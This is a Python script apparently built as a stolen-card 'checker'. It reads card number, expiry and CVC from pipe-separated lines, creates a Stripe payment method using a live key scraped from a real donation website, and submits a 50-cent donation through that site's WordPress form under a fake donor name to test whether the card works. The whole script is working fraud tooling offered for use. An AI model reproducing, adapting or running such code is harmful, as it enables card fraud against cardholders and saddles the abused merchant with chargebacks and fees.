import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F560413f346%3B+stripe-js-v3%2F560413f346%3B+card-element&referrer=https%3A%2F%2Fwww.aaronabke.com&time_on_page=52825&key=pk_live_51GGaWMAJSPmZlL2afbQZDpv2vTIB3894XGGxamKUqTCkHjOi5xT0xBMn8GYDCIiWqs2T6mFpst5ZwqnwlJzghdDC00HIeZ9lw8'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = r1.json()['id']
	
	cookies = {
	    'cookie_notice_accepted': 'true',
	    '__stripe_mid': '65f075b0-bfc5-4647-b478-3594b195d66e3459f5',
	    '__stripe_sid': '04bae8b8-3e40-4f2b-a54f-e3a750cdb59237daf8',
	}
	
	headers = {
	    'authority': 'www.aaronabke.com',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': 'cookie_notice_accepted=true; __stripe_mid=65f075b0-bfc5-4647-b478-3594b195d66e3459f5; __stripe_sid=04bae8b8-3e40-4f2b-a54f-e3a750cdb59237daf8',
	    'origin': 'https://www.aaronabke.com',
	    'referer': 'https://www.aaronabke.com/donate/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1744935267616',
	}
	
	data = {
	    'data': 'item_4__fluent_sf=&__fluent_form_embded_post_id=884&_fluentform_4_fluentformnonce=a458ecc2cf&_wp_http_referer=%2Fdonate%2F&names%5Bfirst_name%5D=Rodam&names%5Blast_name%5D=User&email=rodamuser08%40gmail.com&custom-payment-amount=0.50&payment_input=0&payment_input_custom_0=0&payment_input_custom_1=&input_text=&payment_method=stripe&__stripe_payment_method_id='+str(pm)+'',
	    'action': 'fluentform_submit',
	    'form_id': '4',
	}
	
	r2 = requests.post(
	    'https://www.aaronabke.com/wp-admin/admin-ajax.php',
	    params=params,
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
	
	return (r2.json())
	

